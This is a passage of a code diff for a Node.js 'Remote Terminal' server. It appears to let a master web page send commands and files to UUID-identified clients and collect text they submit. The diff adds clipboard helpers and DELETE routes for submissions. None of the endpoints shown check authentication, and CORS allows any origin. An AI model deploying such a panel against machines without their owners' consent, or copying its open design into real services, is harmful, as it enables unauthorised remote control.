@@ -10,29 +10,29 @@ const server = http.createServer(app);
 
 const io = new Server(server, {
   transports: ['websocket', 'polling'],
-  cors: { origin: "*", methods: ["GET", "POST"] },
+  cors: { origin: "*", methods: ["GET", "POST", "DELETE"] },
   pingInterval: 25000,
   pingTimeout: 60000
 });
 
 app.set('trust proxy', 1);
 
-// ---------- Body parsing + CORS (for /submission) ----------
+// ---------- Body parsing + CORS ----------
 app.use(express.json({ limit: '50mb' }));
 app.use(express.text({ limit: '50mb' }));
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
   res.header('Access-Control-Allow-Headers', 'Content-Type, X-Client-UUID');
   if (req.method === 'OPTIONS') return res.sendStatus(200);
   next();
 });
 
-// ---------- Existing state ----------
-const clients = new Map();          // uuid -> { socket, cwd, env, epoch }
-const viewers = new Map();          // uuid -> Set of sockets
-const masters = new Set();          // Set of sockets
-const clientHeartbeats = new Map(); // uuid -> lastHeartbeat ts
+// ---------- State ----------
+const clients = new Map();
+const viewers = new Map();
+const masters = new Set();
+const clientHeartbeats = new Map();
 
 // ---------- Postboard state ----------
 const SUBMISSIONS_PATH = path.join(__dirname, 'submissions.json');
@@ -68,10 +68,10 @@ function saveSubmissions() {
 
 loadSubmissions();
 
-// ---------- Seen-UUIDs persistence ----------
+// ---------- Seen UUIDs ----------
 const SEEN_UUIDS_PATH = path.join(__dirname, 'seen_uuids.json');
-let seenUUIDs = [];                 // array of { uuid, firstSeen, lastSeen }
-let seenUUIDsMap = new Map();       // uuid -> entry
+let seenUUIDs = [];
+let seenUUIDsMap = new Map();
 
 function loadSeenUUIDs() {
   try {
@@ -104,7 +104,6 @@ function markUUIDSeen(uuid) {
   const now = Date.now();
   const existing = seenUUIDsMap.get(uuid);
   if (existing) {
-    // Only persist lastSeen changes at most once per minute to reduce disk writes
     const shouldSave = (now - existing.lastSeen) > 60000;
     existing.lastSeen = now;
     if (shouldSave) saveSeenUUIDs();
@@ -119,7 +118,7 @@ function markUUIDSeen(uuid) {
 loadSeenUUIDs();
 
 // =====================================================
-// ============== public-server/index.html =============
+// ============ public-server/index.html (master) ======
 // =====================================================
 const publicDir = path.join(__dirname, 'public-server');
 if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });
@@ -136,27 +135,17 @@ const indexHtml = `<!DOCTYPE html>
     body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
 
     #terminal {
-      flex: 1 1 auto;
-      min-height: 0;
-      padding: 15px;
-      overflow-y: auto;
-      white-space: pre-wrap;
-      font-size: 13px;
-      line-height: 1.4;
+      flex: 1 1 auto; min-height: 0;
+      padding: 15px; overflow-y: auto; white-space: pre-wrap;
+      font-size: 13px; line-height: 1.4;
     }
     #inputLine {
-      flex: 0 0 auto;
-      background: #1a1a1a;
-      padding: 8px 15px;
-      border-top: 1px solid #333;
+      flex: 0 0 auto; background: #1a1a1a;
+      padding: 8px 15px; border-top: 1px solid #333;
     }
     #cmd {
-      width: 100%;
-      background: transparent;
-      border: none;
-      color: #0f0;
-      font-family: 'Courier New', monospace;
-      font-size: 13px;
+      width: 100%; background: transparent; border: none;
+      color: #0f0; font-family: 'Courier New', monospace; font-size: 13px;
     }
     #cmd:focus { outline: none; }
 
@@ -165,6 +154,17 @@ const indexHtml = `<!DOCTYPE html>
     .system { color: #3af; }
     .command { color: #5f5; }
     .lineCheckbox { margin-top: 2px; cursor: pointer; }
+    .uuid-copyable {
+      color: #5f5; cursor: pointer;
+      text-decoration: underline dotted;
+      text-decoration-color: #5f58;
+      padding: 0 1px;
+    }
+    .uuid-copyable:hover {
+      text-decoration-style: solid;
+      background: #5f52;
+      border-radius: 2px;
+    }
     ::-webkit-scrollbar { width: 8px; }
     ::-webkit-scrollbar-track { background: #1a1a1a; }
     ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
@@ -210,6 +210,19 @@ const indexHtml = `<!DOCTYPE html>
     #fileProgress .progress-bar-bg { width: 100%; height: 14px; background: #2a2a2a; border-radius: 7px; overflow: hidden; }
     #fileProgress .progress-bar-fill { height: 100%; width: 0%; background: #0f0; border-radius: 7px; transition: width 0.3s; }
     #fileProgress .progress-pct { margin-top: 6px; font-size: 11px; color: #aaa; }
+
+    #toast {
+      position: fixed; bottom: 80px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: #0f0; color: #000;
+      padding: 8px 16px; border-radius: 4px;
+      font-size: 12px; font-weight: bold;
+      opacity: 0; pointer-events: none;
+      transition: all 0.2s ease;
+      z-index: 10000;
+      font-family: 'Courier New', monospace;
+    }
+    #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
   </style>
 </head>
 <body>
@@ -247,6 +260,8 @@ const indexHtml = `<!DOCTYPE html>
     <div class="progress-pct" id="progressPct">0%</div>
   </div>
 
+  <div id="toast"></div>
+
   <div id="inputLine">
     <input type="text" id="cmd" autocomplete="off" spellcheck="false" placeholder="Type command..." autofocus />
   </div>
@@ -264,6 +279,41 @@ const indexHtml = `<!DOCTYPE html>
     var lastCtrlClickedCheckbox = null;
     var downloadMeta = null;
     var pendingDownloadChunks = {};
+
+    // ---------- Clipboard helpers ----------
+    function copyToClipboard(text, message) {
+      function done() { showToast(message || 'Copied!'); }
+      function fail() {
+        // Fallback: temp textarea
+        try {
+          var ta = document.createElement('textarea');
+          ta.value = text;
+          ta.style.position = 'fixed';
+          ta.style.opacity = '0';
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
+          done();
+        } catch (e) {
+          showToast('Copy failed');
+        }
+      }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done).catch(fail);
+      } else {
+        fail();
+      }
+    }
+
+    var toastTimer = null;
+    function showToast(msg) {
+      var t = document.getElementById('toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      if (toastTimer) clearTimeout(toastTimer);
+      toastTimer = setTimeout(function() { t.classList.remove('show'); }, 1500);
+    }
 
     document.querySelectorAll('input[name="selMode"]').forEach(function(radio) {
       radio.addEventListener('change', function(e) {
@@ -311,10 +361,15 @@ const indexHtml = `<!DOCTYPE html>
       var wrapper = document.createElement('div');
       wrapper.className = 'output';
       if (cls) wrapper.classList.add(cls);
+
       var uuidMatch = text.match(/^\\[([0-9a-fA-F-]{8,36})\\]/);
+
       var checkbox = document.createElement('input');
       checkbox.type = 'checkbox';
       checkbox.className = 'lineCheckbox';
+
+      var textDiv = document.createElement('div');
+
       if (uuidMatch) {
         checkbox.dataset.uuid = uuidMatch[1];
         checkbox.disabled = (selectionMode === 'none');
@@ -353,12 +408,24 @@ const indexHtml = `<!DOCTYPE html>
             lastCtrlClickedCheckbox = null;
           }
         });
+
+        // Clickable UUID prefix — click to copy
+        var uuidSpan = document.createElement('span');
+        uuidSpan.className = 'uuid-copyable';
+        uuidSpan.textContent = uuidMatch[0];
+        uuidSpan.title = 'Click to copy UUID';
+        uuidSpan.addEventListener('click', function(e) {
+          e.stopPropagation();
+          copyToClipboard(uuidMatch[1], 'UUID copied: ' + uuidMatch[1]);
+        });
+        textDiv.appendChild(uuidSpan);
+        textDiv.appendChild(document.createTextNode(text.substring(uuidMatch[0].length)));
       } else {
         checkbox.disabled = true;
         checkbox.title = 'No UUID on this line';
+        textDiv.textContent = text;
       }
-      var textDiv = document.createElement('div');
-      textDiv.textContent = text;
+
       wrapper.appendChild(checkbox);
       wrapper.appendChild(textDiv);
       return wrapper;
@@ -381,10 +448,8 @@ const indexHtml = `<!DOCTYPE html>
     }
 
     socket = io({
-      reconnection: true,
-      reconnectionDelay: 1000,
-      reconnectionDelayMax: 5000,
-      reconnectionAttempts: Infinity
+      reconnection: true, reconnectionDelay: 1000,
+      reconnectionDelayMax: 5000, reconnectionAttempts: Infinity
     });
 
     socket.on('connect', function() {
@@ -442,11 +507,8 @@ const indexHtml = `<!DOCTYPE html>
         var blob = new Blob([bytes]);
         var url = URL.createObjectURL(blob);
         var a = document.createElement('a');
-        a.href = url;
-        a.download = downloadMeta.name;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+        a.href = url; a.download = downloadMeta.name;
+        document.body.appendChild(a); a.click(); document.body.removeChild(a);
         setTimeout(function() { URL.revokeObjectURL(url); }, 10000);
         appendLine('[System] Downloaded "' + downloadMeta.name + '" (' + downloadMeta.size + ' bytes)', 'system');
       } catch (e) {
@@ -533,11 +595,8 @@ const indexHtml = `<!DOCTYPE html>
         var totalChunks = Math.ceil(base64.length / chunkSize);
         var uploadId = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
         var meta = {
-          uploadId: uploadId,
-          name: file.name,
-          size: file.size,
-          totalChunks: totalChunks,
-          chunkSize: chunkSize,
+          uploadId: uploadId, name: file.name, size: file.size,
+          totalChunks: totalChunks, chunkSize: chunkSize,
           targets: targets ? Array.from(targets) : null
         };
         socket.emit('upload-start', meta);
@@ -553,8 +612,7 @@ const indexHtml = `<!DOCTYPE html>
             targets: targets ? Array.from(targets) : null
           });
           sent++;
-          var pct = Math.round((sent / totalChunks) * 100);
-          showProgress('Uploading: ' + file.name, pct);
+          showProgress('Uploading: ' + file.name, Math.round((sent / totalChunks) * 100));
           setTimeout(sendNext, 10);
         }
         sendNext();
@@ -601,196 +659,188 @@ const postboardHtml = `<!DOCTYPE html>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body {
-      height: 100%;
-      background: #121212;
-      color: #eee;
+      height: 100%; background: #121212; color: #eee;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
       font-size: 14px;
     }
     body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
 
     header {
-      flex: 0 0 auto;
-      background: #1a1a1a;
+      flex: 0 0 auto; background: #1a1a1a;
       border-bottom: 1px solid #2a2a2a;
       padding: 12px 20px;
-      display: flex;
-      gap: 12px;
-      align-items: center;
+      display: flex; gap: 12px; align-items: center;
     }
     header h1 {
-      font-size: 16px;
-      font-weight: 600;
-      color: #5f5;
-      margin-right: 8px;
-      white-space: nowrap;
+      font-size: 16px; font-weight: 600;
+      color: #5f5; margin-right: 8px; white-space: nowrap;
     }
     header input {
-      flex: 1;
-      max-width: 500px;
-      background: #0a0a0a;
-      border: 1px solid #2a2a2a;
-      color: #eee;
-      padding: 8px 12px;
-      border-radius: 4px;
-      font-size: 13px;
-      font-family: 'Courier New', monospace;
+      flex: 1; max-width: 500px;
+      background: #0a0a0a; border: 1px solid #2a2a2a;
+      color: #eee; padding: 8px 12px; border-radius: 4px;
+      font-size: 13px; font-family: 'Courier New', monospace;
     }
-    header input:focus {
-      outline: none;
-      border-color: #0f08;
-    }
+    header input:focus { outline: none; border-color: #0f08; }
     header button {
-      background: #2a2a2a;
-      color: #eee;
-      border: 1px solid #333;
-      padding: 8px 12px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 12px;
+      background: #2a2a2a; color: #eee; border: 1px solid #333;
+      padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 12px;
     }
     header button:hover { background: #3a3a3a; }
-    #status {
-      color: #888;
-      font-size: 11px;
-      white-space: nowrap;
-    }
+    #status { color: #888; font-size: 11px; white-space: nowrap; }
 
-    #main {
-      flex: 1 1 auto;
-      display: flex;
-      min-height: 0;
-      overflow: hidden;
-    }
+    #main { flex: 1 1 auto; display: flex; min-height: 0; overflow: hidden; }
 
     aside {
-      flex: 0 0 280px;
-      background: #161616;
+      flex: 0 0 280px; background: #161616;
       border-right: 1px solid #2a2a2a;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
+      display: flex; flex-direction: column; overflow: hidden;
     }
     aside .sidebar-header {
-      padding: 10px 15px;
-      font-size: 11px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      color: #888;
-      border-bottom: 1px solid #2a2a2a;
-      flex: 0 0 auto;
+      padding: 10px 15px; font-size: 11px;
+      text-transform: uppercase; letter-spacing: 1px;
+      color: #888; border-bottom: 1px solid #2a2a2a; flex: 0 0 auto;
     }
     #uuidList {
-      flex: 1 1 auto;
-      overflow-y: auto;
-      padding: 6px 0;
+      flex: 1 1 auto; overflow-y: auto; padding: 6px 0;
     }
     .uuid-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 8px;
-      padding: 8px 15px;
-      cursor: pointer;
-      color: #ccc;
-      font-size: 12px;
-      border: none;
-      background: none;
-      width: 100%;
-      text-align: left;
-      font-family: 'Courier New', monospace;
+      display: flex; justify-content: space-between; align-items: center;
+      gap: 8px; padding: 8px 15px; cursor: pointer;
+      color: #ccc; font-size: 12px; border: none; background: none;
+      width: 100%; text-align: left; font-family: 'Courier New', monospace;
+      user-select: none;
     }
     .uuid-item:hover { background: #1f1f1f; }
-    .uuid-item.active { background: #0f02; color: #5f5; border-left: 3px solid #0f0; padding-left: 12px; }
+    .uuid-item.active {
+      background: #0f02; color: #5f5;
+      border-left: 3px solid #0f0; padding-left: 12px;
+    }
     .uuid-item .uuid-label {
-      flex: 1 1 auto;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
+      flex: 1 1 auto; overflow: hidden;
+      text-overflow: ellipsis; white-space: nowrap;
+    }
+    .uuid-item .uuid-actions {
+      flex: 0 0 auto; display: flex;
+      align-items: center; gap: 4px;
     }
     .uuid-item .count {
-      flex: 0 0 auto;
-      background: #2a2a2a;
-      color: #aaa;
-      font-size: 10px;
-      padding: 1px 6px;
-      border-radius: 10px;
+      background: #2a2a2a; color: #aaa;
+      font-size: 10px; padding: 1px 6px; border-radius: 10px;
+      min-width: 20px; text-align: center;
     }
     .uuid-item.active .count { background: #0f03; color: #5f5; }
     .uuid-item .online-dot {
-      display: inline-block;
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      background: #5f5;
-      margin-right: 4px;
-      vertical-align: middle;
+      display: inline-block; width: 6px; height: 6px;
+      border-radius: 50%; background: #5f5;
+      margin-right: 5px; vertical-align: middle;
     }
+    .uuid-item .copy-mini {
+      background: none; border: none; cursor: pointer;
+      color: #666; font-size: 11px; padding: 2px 4px;
+      border-radius: 3px; line-height: 1;
+      opacity: 0; transition: opacity 0.15s, color 0.15s;
+    }
+    .uuid-item:hover .copy-mini { opacity: 1; }
+    .uuid-item .copy-mini:hover { color: #eee; background: #2a2a2a; }
 
     main {
-      flex: 1 1 auto;
-      overflow-y: auto;
-      padding: 16px 20px;
-      min-height: 0;
+      flex: 1 1 auto; overflow-y: auto;
+      padding: 16px 20px; min-height: 0;
     }
 
-    .submission {
-      background: #0d0d0d;
-      border: 1px solid #2a2a2a;
-      border-radius: 6px;
-      margin-bottom: 12px;
-      overflow: hidden;
-    }
-    .submission-header {
-      background: #161616;
-      padding: 8px 12px;
+    #filterHeader {
+      display: flex; justify-content: space-between;
+      align-items: center; gap: 12px;
+      padding-bottom: 12px; margin-bottom: 12px;
       border-bottom: 1px solid #2a2a2a;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 12px;
-      font-size: 11px;
+      font-size: 12px; color: #aaa;
       flex-wrap: wrap;
     }
-    .submission-uuid {
-      color: #5f5;
+    #filterHeader .filter-info { flex: 1 1 auto; min-width: 0; word-break: break-all; }
+    #filterHeader .filter-info strong { color: #5f5; }
+    #filterHeader .filter-info .active-filter {
+      background: #0f02; color: #5f5;
+      padding: 1px 6px; border-radius: 3px;
+      border: 1px solid #0f08;
       font-family: 'Courier New', monospace;
+    }
+    #bulkDeleteBtn {
+      background: #3a1a1a; border: 1px solid #f008;
+      color: #f55; padding: 5px 10px;
+      font-size: 11px; border-radius: 4px; cursor: pointer;
+    }
+    #bulkDeleteBtn:hover { background: #5a2a2a; color: #fff; }
+    #bulkDeleteBtn:disabled { opacity: 0.4; cursor: default; }
+
+    .submission {
+      background: #0d0d0d; border: 1px solid #2a2a2a;
+      border-radius: 6px; margin-bottom: 12px; overflow: hidden;
+    }
+    .submission-header {
+      background: #161616; padding: 8px 12px;
+      border-bottom: 1px solid #2a2a2a;
+      display: flex; justify-content: space-between;
+      align-items: center; gap: 12px;
+      font-size: 11px; flex-wrap: wrap;
+    }
+    .submission-title { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .submission-uuid {
+      color: #5f5; font-family: 'Courier New', monospace;
       cursor: pointer;
     }
     .submission-uuid:hover { text-decoration: underline; }
-    .submission-filename {
-      color: #eee;
-      font-weight: 600;
-    }
+    .submission-filename { color: #eee; font-weight: 600; }
     .submission-meta {
-      color: #888;
-      font-size: 10px;
-      display: flex;
-      gap: 12px;
+      color: #888; font-size: 10px;
+      display: flex; gap: 10px; align-items: center;
     }
     .submission-body {
       padding: 10px 12px;
       font-family: 'Courier New', monospace;
-      font-size: 12px;
-      white-space: pre-wrap;
-      word-break: break-all;
-      color: #ddd;
-      max-height: 300px;
-      overflow-y: auto;
+      font-size: 12px; white-space: pre-wrap;
+      word-break: break-all; color: #ddd;
+      max-height: 300px; overflow-y: auto;
       background: #080808;
     }
 
+    .icon-btn {
+      background: none; border: 1px solid transparent;
+      color: #666; cursor: pointer;
+      padding: 2px 6px; border-radius: 3px;
+      font-size: 12px; line-height: 1;
+      transition: all 0.15s;
+    }
+    .icon-btn:hover {
+      color: #eee; background: #2a2a2a; border-color: #333;
+    }
+    .icon-btn.delete-btn:hover {
+      color: #f55; background: #3a1a1a; border-color: #f008;
+    }
+    .icon-btn.copied { color: #5f5 !important; }
+
     .empty-state {
-      text-align: center;
-      padding: 60px 20px;
-      color: #555;
-      font-size: 13px;
+      text-align: center; padding: 60px 20px;
+      color: #555; font-size: 13px;
     }
 
     ::-webkit-scrollbar { width: 8px; height: 8px; }
     ::-webkit-scrollbar-track { background: #0a0a0a; }
     ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
     ::-webkit-scrollbar-thumb:hover { background: #555; }
+
+    #toast {
+      position: fixed; bottom: 30px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: #0f0; color: #000;
+      padding: 8px 16px; border-radius: 4px;
+      font-size: 12px; font-weight: bold;
+      opacity: 0; pointer-events: none;
+      transition: all 0.2s ease;
+      z-index: 10000;
+    }
+    #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    #toast.error { background: #f55; color: #fff; }
   </style>
 </head>
 <body>
@@ -800,19 +850,30 @@ const postboardHtml = `<!DOCTYPE html>
     <button id="refreshBtn">Refresh</button>
     <span id="status">Loading...</span>
   </header>
+
   <div id="main">
     <aside>
       <div class="sidebar-header">Seen Clients</div>
       <div id="uuidList">
-        <button class="uuid-item active" data-uuid=""><span class="uuid-label">All submissions</span><span class="count" id="allCount">0</span></button>
+        <div class="uuid-item active" id="allSubmissionsItem" data-uuid="" title="Show all submissions">
+          <span class="uuid-label">All submissions</span>
+          <span class="uuid-actions"><span class="count" id="allCount">0</span></span>
+        </div>
       </div>
     </aside>
-    <main id="content">
+    <main>
+      <div id="filterHeader" style="display:none;">
+        <div class="filter-info" id="filterInfo"></div>
+        <button id="bulkDeleteBtn">Delete shown</button>
+      </div>
       <div id="submissionList">
         <div class="empty-state">Loading…</div>
       </div>
     </main>
   </div>
+
+  <div id="toast"></div>
+
   <script>
     (function() {
       var seenClients = [];
@@ -828,30 +889,65 @@ const postboardHtml = `<!DOCTYPE html>
       }
 
       function formatTime(ts) {
-        var now = Date.now();
-        var diff = now - ts;
+        var diff = Date.now() - ts;
         if (diff < 60000) return Math.floor(diff/1000) + 's ago';
         if (diff < 3600000) return Math.floor(diff/60000) + 'm ago';
         if (diff < 86400000) return Math.floor(diff/3600000) + 'h ago';
         return new Date(ts).toLocaleString();
       }
 
+      // ---------- Toast ----------
+      var toastTimer = null;
+      function showToast(msg, isError) {
+        var t = document.getElementById('toast');
+        t.textContent = msg;
+        t.className = 'show' + (isError ? ' error' : '');
+        if (toastTimer) clearTimeout(toastTimer);
+        toastTimer = setTimeout(function() { t.className = ''; }, 1800);
+      }
+
+      // ---------- Clipboard ----------
+      function copyToClipboard(text) {
+        function ok() { showToast('Copied: ' + text); }
+        function fail() {
+          try {
+            var ta = document.createElement('textarea');
+            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+            document.body.appendChild(ta); ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            ok();
+          } catch (e) { showToast('Copy failed', true); }
+        }
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(ok).catch(fail);
+        } else fail();
+      }
+
+      // ---------- Sidebar ----------
       function renderSidebar() {
         var list = document.getElementById('uuidList');
         document.getElementById('allCount').textContent = allSubmissions.length;
 
+        // Build existing map from real UUID items only (skip the "All" div)
         var existing = {};
-        Array.from(list.querySelectorAll('.uuid-item')).forEach(function(el) {
-          if (el.dataset.uuid) existing[el.dataset.uuid] = el;
+        Array.from(list.querySelectorAll('.uuid-item[data-uuid]')).forEach(function(el) {
+          var id = el.dataset.uuid;
+          if (id) existing[id] = el;
         });
 
         seenClients.forEach(function(c) {
           var el = existing[c.uuid];
           if (!el) {
-            el = document.createElement('button');
+            el = document.createElement('div');
             el.className = 'uuid-item';
             el.dataset.uuid = c.uuid;
-            el.addEventListener('click', function() { selectUUID(c.uuid); });
+            el.title = 'Click to filter by ' + c.uuid;
+            el.addEventListener('click', function(e) {
+              // Ignore clicks on the copy button or its children
+              if (e.target.closest('.copy-mini')) return;
+              selectUUID(c.uuid);
+            });
             list.appendChild(el);
           }
           delete existing[c.uuid];
@@ -859,14 +955,26 @@ const postboardHtml = `<!DOCTYPE html>
           var onlineDot = c.online ? '<span class="online-dot"></span>' : '';
           el.innerHTML =
             '<span class="uuid-label">' + onlineDot + escapeHtml(c.uuid) + '</span>' +
-            '<span class="count">' + c.submissionCount + '</span>';
+            '<span class="uuid-actions">' +
+              '<button class="copy-mini" title="Copy UUID" data-uuid="' + escapeHtml(c.uuid) + '">📋</button>' +
+              '<span class="count">' + c.submissionCount + '</span>' +
+            '</span>';
+
+          // Wire copy button
+          el.querySelector('.copy-mini').addEventListener('click', function(e) {
+            e.stopPropagation();
+            copyToClipboard(c.uuid);
+          });
+
           el.classList.toggle('active', currentUUID === c.uuid);
         });
 
+        // Remove items no longer in seenClients
         Object.keys(existing).forEach(function(k) { existing[k].remove(); });
 
-        var allBtn = list.querySelector('.uuid-item[data-uuid=""]');
-        if (allBtn) allBtn.classList.toggle('active', currentUUID === '');
+        // Update "All" active state
+        var allItem = document.getElementById('allSubmissionsItem');
+        allItem.classList.toggle('active', currentUUID === '');
       }
 
       function selectUUID(uuid) {
@@ -875,6 +983,7 @@ const postboardHtml = `<!DOCTYPE html>
         renderSubmissions();
       }
 
+      // ---------- Filtering ----------
       function filterSubmissions() {
         var q = currentSearch.toLowerCase();
         var base = currentUUID
@@ -888,9 +997,27 @@ const postboardHtml = `<!DOCTYPE html>
         });
       }
 
+      // ---------- Render submissions ----------
       function renderSubmissions() {
         var list = document.getElementById('submissionList');
+        var header = document.getElementById('filterHeader');
+        var filterInfo = document.getElementById('filterInfo');
+        var bulkBtn = document.getElementById('bulkDeleteBtn');
+
         var items = filterSubmissions();
+
+        // Header / bulk delete visibility
+        var showHeader = items.length > 0 && (currentUUID || currentSearch);
+        header.style.display = showHeader ? 'flex' : 'none';
+
+        if (showHeader) {
+          var parts = [];
+          if (currentUUID) parts.push('UUID <span class="active-filter">' + escapeHtml(currentUUID) + '</span>');
+          if (currentSearch) parts.push('search <span class="active-filter">' + escapeHtml(currentSearch) + '</span>');
+          filterInfo.innerHTML = 'Filtered by ' + parts.join(' + ') + ' — showing <strong>' + items.length + '</strong> submission' + (items.length === 1 ? '' : 's');
+          bulkBtn.textContent = 'Delete ' + items.length + ' shown';
+          bulkBtn.disabled = false;
+        }
 
         if (items.length === 0) {
           list.innerHTML = '<div class="empty-state">' +
@@ -905,16 +1032,20 @@ const postboardHtml = `<!DOCTYPE html>
           var content = s.content || '';
           var truncated = content.length > 5000;
           var shown = truncated ? content.substring(0, 5000) + '\\n... [truncated]' : content;
+          var safeUuid = escapeHtml(s.uuid);
+          var safeId = s.id;
 
-          html += '<div class="submission">';
+          html += '<div class="submission" data-id="' + safeId + '">';
           html += '<div class="submission-header">';
-          html += '<div>';
+          html += '<div class="submission-title">';
           html += '<span class="submission-filename">' + escapeHtml(s.filename || '(no name)') + '</span>';
-          html += ' <span class="submission-uuid" data-uuid="' + escapeHtml(s.uuid) + '" title="Click to filter by this UUID">[' + escapeHtml(s.uuid) + ']</span>';
+          html += '<span class="submission-uuid" data-uuid="' + safeUuid + '" title="Click to filter by this UUID">[' + safeUuid + ']</span>';
+          html += '<button class="icon-btn copy-btn" data-uuid="' + safeUuid + '" title="Copy UUID">📋</button>';
           html += '</div>';
           html += '<div class="submission-meta">';
           html += '<span>' + s.size + ' bytes</span>';
           html += '<span>' + formatTime(s.timestamp) + '</span>';
+          html += '<button class="icon-btn delete-btn" data-id="' + safeId + '" title="Delete this submission">✕</button>';
           html += '</div>';
           html += '</div>';
           html += '<div class="submission-body">' + escapeHtml(shown) + '</div>';
@@ -922,13 +1053,78 @@ const postboardHtml = `<!DOCTYPE html>
         });
         list.innerHTML = html;
 
+        // Wire up UUID filter clicks
         list.querySelectorAll('.submission-uuid').forEach(function(el) {
           el.addEventListener('click', function() {
             selectUUID(el.dataset.uuid);
           });
         });
+
+        // Wire up copy buttons
+        list.querySelectorAll('.copy-btn').forEach(function(el) {
+          el.addEventListener('click', function() {
+            copyToClipboard(el.dataset.uuid);
+            el.classList.add('copied');
+            setTimeout(function() { el.classList.remove('copied'); }, 1000);
+          });
+        });
+
+        // Wire up delete buttons
+        list.querySelectorAll('.delete-btn').forEach(function(el) {
+          el.addEventListener('click', function() {
+            deleteSubmission(parseInt(el.dataset.id, 10));
+          });
+        });
       }
 
+      // ---------- Single delete ----------
+      function deleteSubmission(id) {
+        if (!confirm('Delete submission #' + id + '?')) return;
+        fetch('/submission/' + id, { method: 'DELETE' })
+          .then(function(r) {
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            return r.json();
+          })
+          .then(function() {
+            allSubmissions = allSubmissions.filter(function(s) { return s.id !== id; });
+            renderSidebar();
+            renderSubmissions();
+            showToast('Submission deleted');
+          })
+          .catch(function(err) {
+            showToast('Delete failed: ' + err.message, true);
+          });
+      }
+
+      // ---------- Bulk delete shown ----------
+      document.getElementById('bulkDeleteBtn').addEventListener('click', function() {
+        var items = filterSubmissions();
+        if (items.length === 0) return;
+        if (!confirm('Delete all ' + items.length + ' shown submission(s)?\\nThis cannot be undone.')) return;
+
+        var ids = items.map(function(s) { return s.id; });
+        fetch('/submissions', {
+          method: 'DELETE',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ids: ids })
+        })
+        .then(function(r) {
+          if (!r.ok) throw new Error('HTTP ' + r.status);
+          return r.json();
+        })
+        .then(function(data) {
+          var idSet = new Set(ids);
+          allSubmissions = allSubmissions.filter(function(s) { return !idSet.has(s.id); });
+          renderSidebar();
+          renderSubmissions();
+          showToast('Deleted ' + (data.deleted || ids.length) + ' submission(s)');
+        })
+        .catch(function(err) {
+          showToast('Bulk delete failed: ' + err.message, true);
+        });
+      });
+
+      // ---------- Fetch everything ----------
       function fetchAll() {
         document.getElementById('status').textContent = 'Loading...';
         Promise.all([
@@ -948,6 +1144,7 @@ const postboardHtml = `<!DOCTYPE html>
         });
       }
 
+      // ---------- Wiring ----------
       var searchInput = document.getElementById('searchInput');
       searchInput.addEventListener('input', function() {
         currentSearch = searchInput.value.trim();
@@ -955,6 +1152,11 @@ const postboardHtml = `<!DOCTYPE html>
       });
 
       document.getElementById('refreshBtn').addEventListener('click', fetchAll);
+
+      // "All submissions" click — this was previously missing!
+      document.getElementById('allSubmissionsItem').addEventListener('click', function() {
+        selectUUID('');
+      });
 
       fetchAll();
       refreshTimer = setInterval(function() {
@@ -968,7 +1170,7 @@ const postboardHtml = `<!DOCTYPE html>
 fs.writeFileSync(path.join(publicDir, 'postboard.html'), postboardHtml);
 
 // =====================================================
-// ================= POSTBOARD ROUTES ==================
+// ================ SUBMISSION ROUTES ==================
 // =====================================================
 
 app.post('/submission', (req, res) => {
@@ -1019,19 +1221,61 @@ app.post('/submission', (req, res) => {
 
 app.get('/submission', (req, res) => {
   res.type('text/plain').send(
-    'Remote Terminal — Postboard submission endpoint\\n' +
-    '\\n' +
-    'POST application/json:\\n' +
-    '  { "uuid": "<uuid>", "content": "<text>", "filename": "<optional>" }\\n' +
-    '\\n' +
-    'POST text/plain:\\n' +
-    '  body = raw text; uuid from ?uuid=<uuid> or X-Client-UUID header\\n' +
-    '\\n' +
-    'Example (from the client directory):\\n' +
-    '  node send.js https://your-server/submission myfile.txt\\n'
+    'Remote Terminal — Postboard submission endpoint\n' +
+    '\n' +
+    'POST application/json:\n' +
+    '  { "uuid": "<uuid>", "content": "<text>", "filename": "<optional>" }\n' +
+    '\n' +
+    'POST text/plain:\n' +
+    '  body = raw text; uuid from ?uuid=<uuid> or X-Client-UUID header\n' +
+    '\n' +
+    'DELETE /submission/:id  — delete one submission\n' +
+    'DELETE /submissions     — delete many (JSON body: { "ids": [1, 2, ...] })\n'
   );
 });
 
+// Delete a single submission
+app.delete('/submission/:id', (req, res) => {
+  var id = parseInt(req.params.id, 10);
+  if (!Number.isFinite(id)) return res.status(400).json({ error: 'Invalid id' });
+
+  var idx = submissions.findIndex(function(s) { return s.id === id; });
+  if (idx === -1) return res.status(404).json({ error: 'Submission not found' });
+
+  var removed = submissions.splice(idx, 1)[0];
+  saveSubmissions();
